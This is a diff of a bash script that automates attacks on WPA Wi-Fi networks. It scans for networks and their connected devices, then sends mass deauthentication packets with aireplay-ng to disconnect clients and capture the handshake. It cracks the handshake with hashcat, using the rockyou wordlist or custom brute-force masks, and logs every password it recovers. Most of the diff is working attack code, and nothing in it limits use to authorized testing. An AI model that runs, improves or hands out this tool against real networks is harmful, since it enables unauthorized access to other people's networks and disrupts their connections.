@@ -1,9 +1,10 @@
 #!/bin/bash
 
-# version: 3.3 21/1/25 03:25
+# version: 3.4 23/1/25 02:25
 
 
 ### To Do ###
+# Add more Hashcat options. l+d, l+u+d. or auto configure combinations. + Add possibilities calc. + show the mask better. + show empty mask at the beginning.
 # run all networks or range of them at the same time.
 # add more dictioneries than rockyou?
 # specific passwords lists for different vendors
@@ -42,7 +43,7 @@ rockyou_file="$wordlists_dir/rockyou.txt"
 rockyou_gz="$wordlists_dir/rockyou.txt.gz"
 oui_file="$targets_path/oui.txt"
 oui_vendor=""
-gpu_enabled=true # Enable GPU crack
+
 
 # Ensure required directories exist
 mkdir -p "$targets_path"
@@ -71,78 +72,6 @@ function install_dependencies() {
 }
 
 
-
-# -----------------
-# Enable GPU
-# -----------------
-function enable_gpu() {
-    # Check if running in a VM
-    if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
-        echo -e "\n⚠️  You are running inside a virtual machine. GPU acceleration may not be available."
-        return 1
-    fi
-
-    # Detect GPU
-    GPU_INFO=$(lspci -nn | grep -i 'vga\|3d' | grep -i 'nvidia')
-
-    if [[ -n "$GPU_INFO" ]]; then
-        # Extract only the GPU model (e.g., "GeForce RTX 2070 SUPER Mobile / Max-Q")
-        GPU_MODEL=$(echo "$GPU_INFO" | sed -E 's/.*\[(GeForce [^]]+)\].*/\1/')
-        echo -e "GPU detected: \e[1;32mNVIDIA $GPU_MODEL\e[0m"
-    else
-        echo -e "\n\e[1;31mNo NVIDIA GPU detected.\e[0m"
-        read -p "Would you like to install GPU drivers anyway? (Y/n): " response
-        if [[ ! "$response" =~ ^[Yy]$ ]]; then
-            echo -e "\nSkipping GPU driver installation."
-            return 1
-        fi
-    fi
-
-    # Check for CUDA
-    #echo -e "\n🔍 Checking for CUDA installation..."
-    if command -v nvidia-smi &>/dev/null; then
-        CUDA_VERSION=$(nvidia-smi | grep -i "CUDA Version" | awk '{print $6}')
-        echo -e "CUDA is installed. Version: \e[1;34m$CUDA_VERSION\e[0m"
-    else
-        echo -e "\n⚠️  CUDA is not detected."
-    fi
-
-    # Check if Hashcat detects the GPU
-    #echo -e "\nChecking if Hashcat detects the GPU..."
-    HASHCAT_INFO=$(hashcat -I | grep GPU 2>/dev/null)
-
-    if [[ -n "$HASHCAT_INFO" ]]; then
-        echo -e "Hashcat detects the GPU!\n"
-        return 0
-    else
-        echo -e "\n⚠️  Hashcat does not detect the GPU. Possible reasons:"
-        echo -e "   - Missing NVIDIA drivers"
-        echo -e "   - OpenCL not installed"
-        echo -e "   - CUDA not properly configured"
-    fi
-
-    # Ask user whether to install GPU drivers
-    read -p "Would you like to install NVIDIA GPU drivers? (Y/n): " response
-    if [[ "$response" =~ ^[Yy]$ ]]; then
-        echo -e "\n📦 Installing NVIDIA drivers and CUDA..."
-        packages=("linux-headers-amd64" "nvidia-driver" "nvidia-cuda-toolkit")
-        for package in "${packages[@]}"; do
-            if ! dpkg -l | grep -q "^ii  $package "; then
-                echo -e "\nInstalling $package..."
-                sudo apt install -y "$package"
-            else
-                echo -e "✅ $package is already installed."
-            fi
-        done            
-
-        echo -e "\n\e[1;33mPlease reboot your system for changes to take effect.\e[0m"
-    else
-        echo -e "\nGPU driver installation skipped."
-    fi
-}
-
-
-
 # ------------------------------
 # Check Wordlist and OUI file
 # ------------------------------
@@ -161,7 +90,7 @@ function check_wordlist() {
             echo -e "\n\nrockyou.gz found. Unzipping..."
             sudo gzip -d "$rockyou_gz"
         else
-            echo -e "\n\nDownloading the rockyou file...\n"
+            echo -e "\n\nDownloading the rockyou wordlist file.\n"
             sudo wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
             wait
         fi
@@ -170,12 +99,11 @@ function check_wordlist() {
     if [ -f "$oui_file" ]; then
         echo
     else
-       echo -e "\n\nDownloading OUI file - Vendors detailes...\n"
+       echo -e "\n\nDownloading OUI file - Vendors detailes.\n"
        wget -q https://raw.githubusercontent.com/Doksy/OUI-list-2025/main/oui.txt -O  "$targets_path"/oui.txt
        wait
     fi         
 }
-
 
 
 # ------------------------------
@@ -221,7 +149,6 @@ function adapter_config() {
 		return 1
 	fi
 }
-
 
 
 # ------------------------------
@@ -324,7 +251,6 @@ function network_scanner() {
 }
 
 
-
 # ------------------------------
 # Choose Network
 # ------------------------------
@@ -384,11 +310,11 @@ function choose_network() {
 
         if [ "$encryption" = "OPN" ]; then
             echo -e "\033[1mThe Network is open.\033[0m"
-            echo -e "Choose different Network..\n"
+            echo -e "Choose different Network.\n"
             continue  
         elif [[ "$encryption" == *WPA3* ]]; then
             echo -e "\033[1mThe encryption is "$encryption". This script can't crack it yet.\033[0m"
-            echo -e "Choose different Network..\n"
+            echo -e "Choose different Network.\n"
             continue 
         fi
 
@@ -397,21 +323,22 @@ function choose_network() {
             wifi_password=$(sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The wifi password is:" | awk -F': ' '{print $2}' | xargs)
             echo -e "\033[1;32mPassword already exists for this network!\033[0m"
             echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
-            echo -e "Choose different Network..\n"
+            echo -e "Choose different Network.\n"
             continue 
         fi
 
-        # Check if this BSSID was previously marked as failed    
-        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "Password not found in rockyou.txt"; then
-            echo -e "\033[1;34mPassword for $bssid_name (BSSID: $bssid_address)\033[0m was already checked and \033[1;31mnot found in rockyou.txt file.\033[0m\n" 
-            echo -e "Choose different Network..\n"
-            continue 
+        # Check if this BSSID was previously marked as failed with Rockyou wordlist   
+        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "Password not cracked with Rockyou wordlist"; then
+            echo -e "\033[1;34mPassword for $bssid_name (BSSID: $bssid_address)\033[0m was already checked and \033[1;31mnot found in Rockyou wordlist.\033[0m\n" 
+            echo -e "Choose different Attack..\n"
+            choose_password_attack
+            #continue 
         fi
 
         # If we only captured the handshake from previous scan
         if [ -d "$targets_path/$bssid_name" ]; then
             if sudo grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
-                echo -e "\033[1;32mHandshake found from previous scan!\033[0m\n"
+                echo -e "\033[1;32mHandshake found from previous scan.\033[0m\n"
                 sudo pkill aireplay-ng
                 sudo pkill airodump-ng
                 cleanup
@@ -431,7 +358,6 @@ function choose_network() {
 }
 
 
-
 # ------------------------------
 # Validate Network
 # ------------------------------
@@ -440,7 +366,7 @@ function validate_network() {
         echo -e "\e[1mValidating network:\e[0m"
         gnome-terminal --geometry=105x15-10000-10000 -- script -c "sudo airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
 	found=0
-	for (( i=0; i<10; i++ )); do
+	for (( i=0; i<15; i++ )); do
 	    if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
 		found=1
 		echo -e "Network available! \n"
@@ -456,7 +382,6 @@ function validate_network() {
 	    another_scan_prompt
 	fi
 }
-
 
 
 # ------------------------------------
@@ -484,56 +409,67 @@ function get_oui_vendor() {
 }
 
 
-
 # ------------------------------
 # Dvices Scanner
 # ------------------------------
 function devices_scanner() {
-	echo -e "\e[1m\nStart scanning for devices ->>\e[0m"
-	sleep 2
-	for ((i=1; i<=20; i++)); do
-	    target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")
-	    if [ -n "$target_devices" ]; then
-		# Print Devices_Found with vendor names
-		echo -e "\033[1;33m\nDevices Found:\033[0m" 
-		echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
-		    if [[ -n "$mac" ]]; then
-			# Call the function to get the vendor
-			vendor=$(get_oui_vendor_scan "$mac")
-			if [[ -n "$vendor" ]]; then
-			    echo -e "$mac - $vendor"
-			else
-			    echo -e "$mac"
-			fi
-		    fi
-		done		
-		echo
-		break
-	    fi
-	    echo -e "Scanning for devices..  \e[1;34m$i/20\e[0m"
-	    
-	    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
-		echo -e "\033[1;32m->> Got the handshake!\033[0m\n"
-		sudo pkill aireplay-ng
-		sudo pkill airodump-ng
-		echo
-		echo --- >> $targets_path/wifi_passwords.txt
-		printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
-		cleanup
-		choose_password_attack	    
-	    fi
-	    
-	    sleep 3
-	done
-	if [ -z "$target_devices" ]; then
-	    echo -e "\033[1m\nNo device were found.\033[0m"
-	    sudo pkill airodump-ng
-	    rm -r $targets_path/"$bssid_name"
-	    another_scan_prompt
-	fi
-	sleep 2
-}
+    echo -e "\e[1m\nStart scanning for devices ->>\e[0m"
+    sleep 2
 
+    duration=60  # Set countdown time (seconds)
+    
+    while [ $duration -gt 0 ]; do
+        target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")
+
+        if [ -n "$target_devices" ]; then
+            # Print Devices_Found with vendor names
+            echo -e "\n\n\033[1;33mDevices Found:\033[0m" 
+            echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
+                if [[ -n "$mac" ]]; then
+                    vendor=$(get_oui_vendor_scan "$mac")
+                    if [[ -n "$vendor" ]]; then
+                        echo -e "$mac - $vendor"
+                    else
+                        echo -e "$mac"
+                    fi
+                fi
+            done		
+            echo
+            break
+        fi
+
+        # Convert remaining seconds into MM:SS format
+        minutes=$((duration / 60))
+        seconds=$((duration % 60))
+        printf "\r\e[1;34m%02d:%02d\e[0m Scanning for devices.." "$minutes" "$seconds"
+
+        # Check if handshake is found
+        if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
+            echo -e "\033[1;32m\n->> Got the handshake!\033[0m\n"
+            sudo pkill aireplay-ng
+            sudo pkill airodump-ng
+            echo
+            echo --- >> "$targets_path/wifi_passwords.txt"
+            printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
+            cleanup
+            choose_password_attack
+        fi
+
+        sleep 1
+        ((duration--))
+    done
+
+    # Clear the countdown timer after scanning finishes
+    echo -ne "\r                                      \r"
+
+    if [ -z "$target_devices" ]; then
+        echo -e "\033[1m\nNo device were found.\033[0m"
+        sudo pkill airodump-ng
+        rm -r "$targets_path/$bssid_name"
+        another_scan_prompt
+    fi
+    sleep 2
+}
 
 
 # ------------------------------
@@ -545,9 +481,7 @@ function deauth_attack() {
 	    counter=10
 	    for ((i=1; i<=$counter; i++)); do        
 		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
-		#for target_device in $target_devices; do
-		#    gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
-		#done
+
 		gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
 		
 		echo -e "Attempt \e[1;34m$i/$counter\e[0m to capture handshake of:"         			
@@ -565,8 +499,8 @@ function deauth_attack() {
 		    fi
 		done	
 		echo
-		# waiting 6 sec after deauth attack while looking for handshake:
-		for ((j=1; j<=6; j++)); do
+		# waiting 9 sec after deauth attack while looking for handshake:
+		for ((j=1; j<=9; j++)); do
 		    sleep 1
 		    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
 		        echo -e "\033[1;32m->> Got the handshake!\033[0m\n"
@@ -580,7 +514,7 @@ function deauth_attack() {
 		done
 	    # after 10 unseccessfull attempts, quit the script:
 	    if [ "$i" == "$counter" ]; then
-	    	echo -e "\033[1m\nNo handshake obtained within 2 minutes. Try again.\033[0m"
+	    	echo -e "\033[1m\nNo handshake obtained within 1.5 minutes. Try again.\033[0m"
 	    	sudo pkill aireplay-ng
 		sudo pkill airodump-ng
 		rm -r $targets_path/"$bssid_name"
@@ -590,143 +524,167 @@ function deauth_attack() {
 }
 
 
-
-# --------------------------------------------------
-# Dictionary Attack - Cracking the Password
-# --------------------------------------------------
+# -------------------------
+# Dictionary Attack
+# -------------------------
 function dictionary_attack() {
-	echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
-	sudo aircrack-ng "$targets_path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$targets_path/$bssid_name/$bssid_name-wifi_password.txt"
-	echo
-	if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
-	    wifi_pass=$(cat "$targets_path/$bssid_name/$bssid_name-wifi_password.txt")
-	    echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
-	    bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
-            sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
-            rm -r $targets_path/"$bssid_name" 
-	    exit 1
-	else
-	    echo -e "\nCouldn't finf a match from rockyou wordlist..\n"
-	    sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not found in rockyou.txt" "$targets_path/wifi_passwords.txt"
-	    
-	    read -p "Do you want to crack with Hashcat (Y/n)? " choice
-	    case $choice in
-		    y|Y)
-			hashcat_crack
-			;;
-		    n|N)
-			another_scan_prompt
-			;;
-		    *)
-			echo "Invalid choice. Please enter 'y' or 'n'."
-			;;
-	     esac 	    
-	fi
+
+    hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
+	
+    echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
+    gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -m 22000 -a 0 "$targets_path/$bssid_name/hash.hc22000" $rockyou_file --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable"
+
+    echo
+    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
+        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
+        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
+        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
+        rm -r $targets_path/"$bssid_name" 
+        exit 1
+    else
+        echo -e "\n\033[1;31m\033[1mCouldn't crack with the Rockyou wordlist..\033[0m\n"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Rockyou wordlist" "$targets_path/wifi_passwords.txt"
+        echo
+	read -p "Do you want to run a Brute-Force attack (Y/n)? " choice
+	case $choice in
+	    y|Y)
+		brute-force_attack
+		;;
+	    n|N)
+		another_scan_prompt
+		;;
+	    *)
+		echo "Invalid choice. Please enter 'y' or 'n'."
+		;;
+	esac        
+    fi
 }
 
 
+# ------------------------------
+# Brute-Force attack
+# ------------------------------
+function brute-force_attack() {
 
-# ------------------------------
-# Password Cracking (Hashcat)
-# ------------------------------
-function hashcat_crack() {
-    #echo -e "\033[1;34mConverting capture file to hashcat format..\033[0m\n"
     hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
-
+    echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\e[0m\n"
+    
     # Ask user for password length
     while true; do
-        read -p "Enter the password length (Wi-Fi minimum length is 8): " password_length
+            read -p "Enter password length (Wi-Fi min: 8): " password_length
 
-        # Validate password length
-        if [[ "$password_length" =~ ^[0-9]+$ ]] && [[ "$password_length" -gt 0 ]]; then
-            break
-        else
-            echo "Invalid password length. Please enter a positive number."
-        fi
+	    # If the user presses Enter, set password_length to 8
+	    if [[ -z "$password_length" ]]; then
+		password_length=8
+		echo "default is 8"
+		break
+	    fi
+
+	    # Validate password length
+	    if [[ "$password_length" =~ ^[0-9]+$ ]] && [[ "$password_length" -gt 0 ]]; then
+		break
+	    else
+		echo "Invalid password length. Please enter a positive number."
+	    fi
     done
 
     # Ask user if they want to try every possible combination or customize each position
     while true; do
-        echo -e "\nChoose an option:"
-        echo "1) Try every possible combination"
-        echo "2) Customize each position"
-        read -p "Enter your choice (1 or 2): " option
 
-        full_mask=""
-        if [[ "$option" -eq 1 ]]; then
-            echo -e "\nWe will check all possible characters (ABC-abc-123-!@#) for each position."
-            char_set="?a"
-            
-            # Generate the full mask
-            for (( i=0; i<password_length; i++ )); do
-                full_mask+="$char_set"
-            done
-            break
-        elif [[ "$option" -eq 2 ]]; then
-            echo -e "\nAvailable options for each position:"
-            echo "  1) Uppercase             - ?u -   (ABC)"
-            echo "  2) Lowercase             - ?l -   (abc)"
-            echo "  3) Numbers               - ?d -   (123)"
-            echo "  4) Special character     - ?s -   (!@#)"
-            echo "  5) All character types   - ?a -   (ABC-abc-123-!@#)"
-            echo "  6) Uppercase + Numbers   - ?u?d - (ABC-123)"
-            echo "  7) Enter a specific character:__"
-            echo -e "\n\n\n"
+            full_mask=""
 
-            # Initialize an array for current positions
-            positions=()
-            
-            for (( i=1; i<=password_length; i++ )); do
-                # Clear the previous line and update the mask
-                tput cuu1; tput cuu1; tput el;
-                echo -n "Current mask: [${positions[*]}]"
-                echo
-                
-                # Prompt for position choice
-                while true; do
-                    read -p "Choose an option for position $i (1-7): " choice
+            echo -e "\n\e[1mChoose how to run the Brute-Force:\e[0m"
+            echo -e "1) Try every possible combination                (ABC-abc-123-!@#)   |   $password_length^94 possibilities.\n"
+            echo -e "2) Customize each position of the password:"
+            echo "	1. Uppercase                    ?u   -   (ABC)"
+            echo "	2. Lowercase                    ?l   -   (abc)"
+            echo "	3. Numbers                      ?d   -   (123)"
+            echo "	4. Special character            ?s   -   (!@#)"
+            echo "	5. Uppercase + Numbers          ?u?d -   (ABC-123)"
+            echo "	6. All character types          ?a   -   (ABC-abc-123-!@#)"
+            echo "	7. Enter a specific character:  __"
+            echo -e "\n"
 
-                    case "$choice" in
-                        1) positions+=("?u"); break;; 
-                        2) positions+=("?l"); break;; 
-                        3) positions+=("?d"); break;;
-                        4) positions+=("?s"); break;;
-                        5) positions+=("?a"); break;;
-                        6)                             
-                            positions+=("?1")  # Adding the custom charset for Uppercase + Numbers
-                            charset="-1 ?u?d"   # Define the custom charset
-                            break;;                                                          
-                        7) 
-                            read -p "  Enter the specific character for position $i: " specific_char
-                            if [[ ${#specific_char} -eq 1 ]]; then
-                                positions+=("$specific_char")
-                                tput cuu1; tput el
-                                break
-                            else
-                                echo "You must enter exactly one character."
-                                tput cuu1; tput el
-                            fi
-                            ;;
-                        *) echo "Invalid choice. Please enter a valid option."
-                           tput cuu1; tput el; tput cuu1; tput el;;
-                    esac
-                done
-            done
-            full_mask=$(IFS=; echo "${positions[*]}")
-            break
-        else
-            echo "Invalid option. Please enter either 1 or 2."
-        fi
+	    read -p "Enter your choice (1-2): " option
+        
+		if [[ "$option" -eq 1 ]]; then
+		    echo -e "\nWe will check all possible characters (ABC-abc-123-!@#) for each position."
+		    char_set="?a"
+		    
+		    # Generate the full mask
+		    for (( i=0; i<password_length; i++ )); do
+		        full_mask+="$char_set"
+		    done
+		    break
+		elif [[ "$option" -eq 2 ]]; then
+
+		    # Initialize an array for current positions
+		    positions=()
+		    for (( i=1; i<=password_length; i++ )); do
+		        # Clear the previous line and update the mask
+		        tput cuu1; tput el; tput cuu1; tput el;
+			echo -n -e "\e[1mCurrent mask:\e[0m "
+		        for pos in "${positions[@]}"; do
+			   echo -n -e "\e[1;36m[\e[0m \e[1;31m$pos\e[1;36m \e[1;36m]\e[0m "
+		        done
+		        echo
+		        while true; do
+		            read -p "Choose an option for position $i/$password_length  (Choose 1-7): " choice
+		            case "$choice" in
+		                1) positions+=("?u"); break;; 
+		                2) positions+=("?l"); break;; 
+		                3) positions+=("?d"); break;;
+		                4) positions+=("?s"); break;;
+		                5)                             
+		                    positions+=("?1")  # Adding the custom charset for Uppercase + Numbers
+		                    charset="-1 ?u?d"   # Define the custom charset
+		                    break;;  
+		                6) positions+=("?a"); break;;                                                                                    
+		                7) 
+		                    while true; do
+		                        read -p "  Enter the specific character for position $i: " specific_char
+		                        if [[ ${#specific_char} -eq 1 ]]; then
+		                            positions+=("$specific_char")
+		                            tput cuu1; tput el  # Clear the input line
+		                            tput cuu1; tput el  # Clear the input line
+		                            tput cuu1; tput el  # Clear the input line
+					    echo -n "Current mask: "
+					    for pos in "${positions[@]}"; do
+						echo -n -e "\e[1;36m[\e[0m \e[1;31m$pos\e[1;36m \e[1;36m]\e[0m "
+					    done
+					    echo
+					    ((i++))
+					    break
+		                        else
+		                            tput cuu1; tput el  # Move up and clear error line
+		                            tput cuu1; tput el  # Move up again and clear input line
+		                            echo -e "\e[1;31mInvalid input!\e[0m Please enter exactly ONE character."
+		                        fi
+		                    done
+		                    ;;
+		                *) echo "Invalid choice. Please enter a valid option."
+		                   tput cuu1; tput el 
+		                   tput cuu1; tput el
+		                   ;;
+		            esac
+		        done
+		    done
+		    full_mask=$(IFS=; echo "${positions[*]}")
+		    break 
+                 
+		else
+		    echo "Invalid option. Please enter 1-2."
+		fi
     done
-    
-    echo -e "\n\n\033[1;33mGenerated mask:\033[0m \033[1;31m\033[1m$full_mask\033[0m\n\n"
-    echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\n\e[0m\n"
+
+    echo -e "\n\n\033[1;33mGenerated Hashcat mask:\033[0m \033[1;31m\033[1m$full_mask\033[0m\n\n"
 
     # Run hashcat with the correct options
     if [[ -n "$charset" ]]; then
-        hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $charset "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --potfile-disable
+        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $charset "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
     else
-        hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --potfile-disable
+        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
     fi
            
     echo
@@ -738,9 +696,9 @@ function hashcat_crack() {
         rm -r $targets_path/"$bssid_name" 
         exit 1
     else
-        echo -e "\n\033[1;31m\033[1mCouldn't cracked with Hashcat..\033[0m\n"
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Hashcat" "$targets_path/wifi_passwords.txt"
-        
+        echo -e "\n\033[1;31m\033[1mCouldn't cracked with Brute-Force with this masking: $full_mask\033[0m\n"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Brute-Force of this masking: $full_mask" "$targets_path/wifi_passwords.txt"
+        echo
 	read -p "Do you want to run a dictionary attack (Y/n)? " choice
 	case $choice in
 	    y|Y)
@@ -757,17 +715,64 @@ function hashcat_crack() {
 }
 
 
+# -----------------
+# Enable GPU
+# -----------------
+function enable_gpu() {
+    # Check if running in a VM
+    if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
+        echo -e "\nYou are running inside a virtual machine. GPU acceleration may not be available."
+        return 1
+    fi
 
-# ------------------------------
-# GPU Cracking (Hashcat)
-# ------------------------------
-function check_gpu() {
-    if $gpu_enabled; then
-        echo "Starting Hashcat GPU attack..."
-        sudo hashcat -m 2500 "$targets_path/$bssid_name/$bssid_name-01.cap" "$rockyou_file" --force
+    # Detect GPU
+    GPU_INFO=$(lspci -nn | grep -i 'vga\|3d' | grep -i 'nvidia')
+
+    if [[ -z "$GPU_INFO" ]]; then
+        echo -e "\n\e[1;31mNo NVIDIA GPU detected. Skipping GPU setup.\e[0m"
+        return 1
+    fi
+
+    # Extract GPU model
+    GPU_MODEL=$(echo "$GPU_INFO" | sed -E 's/.*\[(GeForce [^]]+)\].*/\1/')
+    echo -e "GPU detected: \e[1;32mNVIDIA $GPU_MODEL\e[0m"
+
+    # Check for CUDA
+    if command -v nvidia-smi &>/dev/null; then
+        CUDA_VERSION=$(nvidia-smi | grep -i "CUDA Version" | awk '{print $6}')
+        echo -e "CUDA is installed. Version: \e[1;34m$CUDA_VERSION\e[0m"
+    else
+        echo -e "\nCUDA is not detected."
+        read -p "Would you like to install CUDA? (Y/n): " response
+        if [[ "$response" =~ ^[Yy]$ ]]; then
+            echo -e "\nInstalling NVIDIA CUDA drivers..."
+	    packages=("linux-headers-amd64" "nvidia-driver" "nvidia-cuda-toolkit")
+	    for package in "${packages[@]}"; do
+		    if ! dpkg -l | grep -q "^ii  $package "; then
+		        echo -e "\nInstalling $package..."
+		        sudo apt install -y "$package"
+		    else
+		        echo -e "✅ $package is already installed."
+		    fi
+	    done                        
+            echo -e "\n\e[1;33mPlease reboot your system for changes to take effect.\e[0m"
+            return 0
+        else
+            echo -e "\nSkipping CUDA installation. GPU will not be used."
+            return 1
+        fi
+    fi
+    # Check if Hashcat detects the GPU
+    HASHCAT_INFO=$(hashcat -I | grep GPU 2>/dev/null)
+    if [[ -n "$HASHCAT_INFO" ]]; then
+        echo -e "Great! Hashcat detects the GPU and will use it.\n\n"
+        return 0
+    else
+        echo -e "\nHashcat does not detect the GPU."
+        echo -e "Possible reasons:\n   - Missing NVIDIA drivers\n   - OpenCL not installed\n   - CUDA not properly configured"
+        echo -e "\nSkipping GPU setup."
     fi
 }
-
 
 
 # ------------------------------
@@ -794,7 +799,6 @@ function another_scan_prompt() {
 }
 
 
-
 # ------------------------------
 # Cleanup
 # ------------------------------
@@ -805,16 +809,14 @@ function cleanup() {
 }
 
 
-
 # ------------------------------
 # Choose Password Attack
 # ------------------------------
 function choose_password_attack() {
-
 	while true; do
-	    echo -e "\e[1m\nChoose how to crack the password:\e[0m"
-	    echo "1) Dictionary attack (rockyou)"
-	    echo "2) Hashcat crack"
+	    echo -e "\n\033[1;33mChoose how to crack the password:\e[0m"
+	    echo "1) Dictionary attack (Rockyou wordlist)"
+	    echo "2) Brute-Force attack"
 	    read -p "Enter your choice: " choice
 	    echo
 
@@ -823,7 +825,7 @@ function choose_password_attack() {
 		    dictionary_attack
 		    ;;
 		2)
-		    hashcat_crack
+		    brute-force_attack
 		    ;;
 		*)
 		    echo "Invalid choice. Please select 1 or 2."
@@ -833,10 +835,12 @@ function choose_password_attack() {
 }
 
 
+
 # ------------------------------
 # Main Process
 # ------------------------------
 function main_process() {
+	adapter_config
 	network_scanner
 	devices_scanner
 	deauth_attack
@@ -844,15 +848,12 @@ function main_process() {
 	choose_password_attack
 }
 
-
-
-# ------------------------------
-# Script Execution
-# ------------------------------
 install_dependencies
 check_wordlist
-if $gpu_enabled; then
-    enable_gpu
-fi
-adapter_config
+enable_gpu
 main_process
+
+
+
+
+
